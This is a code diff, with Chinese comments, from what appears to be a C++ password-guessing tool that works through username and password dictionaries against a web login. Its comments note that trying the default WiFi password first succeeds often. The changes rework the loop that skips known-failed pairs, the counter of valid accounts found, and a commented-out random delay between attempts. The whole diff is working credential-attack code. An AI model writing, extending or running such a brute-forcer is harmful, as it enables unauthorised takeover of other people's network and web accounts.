@@ -92,7 +92,7 @@ public:
         dic.readInvalidAccounts();
 
         // 获取有效账户的数目
-        effectiveAccountAmount = dic.getEffectiveAccountAmount();
+        effectiveAccountAmount = dic.effectiveAccountCount();
 
         while (true) {
             // 从用户名列表中抽取用户名
@@ -105,26 +105,22 @@ public:
             std::cout << "正在尝试第 " << ++usernameNum << " 个用户名, " <<
                 "共找到 " << effectiveAccountNum << "/" << effectiveAccountNum + effectiveAccountAmount << " 个有效账户.\n" << std::endl;
 
-            // 设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!)
-            currentPassword = initialPassword;
+            // 重置字典, 并设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!),
+            // 同时检查并跳过已知的无效密码, 若为无效密码则直接(跳过本次循环)跳过无效密码, 避免重复测试.
+            dic.copyPasswordDictionary(currentUsername, initialPassword);
 
-            // 重置字典;
-            dic.copyPasswordDictionary();
+            // 统计当前用户名的预期有效密码的数目
+            size_t expectedValidPwdCount = dic.expectedValidPwdCount();
 
             for (uint32_t i = 0; i < pwdTryNum; ++i) {
-                // 检查并跳过已知的无效密码, 若为无效密码则直接(跳过本次循环)跳过无效密码, 避免重复测试.
-                if (dic.isInvalidAccountsExists(currentUsername, currentPassword) == true) {
-                    // 从密码字典中抽取密码
-                    currentPassword = dic.extractUniquePassword();
+                // 从密码字典中抽取密码
+                currentPassword = dic.extractUniquePassword();
 
-                    // 如果密码已被全部抽取完,则结束循环
-                    if (currentPassword == "") break;
-
-                    continue;// 跳过当前循环的剩余部分
-                }
+                // 如果密码已被全部抽取完,则结束循环
+                if (currentPassword == "") break;
 
                 std::cout << "\r当前用户名(" << usernameNum << "/" << amount << "):" << currentUsername <<
-                    "\t当前密码(" << i << "/" << pwdTryNum << "):" << currentPassword << "                ";
+                    "\t当前密码(" << i << "/" << ((expectedValidPwdCount > pwdTryNum) ? pwdTryNum : expectedValidPwdCount) << "):" << currentPassword << "                ";
 
                 WebRequests re(currentUsername, currentPassword);
 
@@ -142,14 +138,8 @@ public:
                     dic.addInvalidAccount(currentUsername, currentPassword);
                 }
 
-                // 从密码字典中抽取密码
-                currentPassword = dic.extractUniquePassword();
-
-                // 如果密码已被全部抽取完,则结束循环
-                if (currentPassword == "") break;
-
                 // 随机延时;
-                // tl.randomDelay(500, 1000);
+                // tl.randomDelay(1000, 2000);
             }
 
             // 将无效账户（用户名和密码集合）保存到CSV文件中。
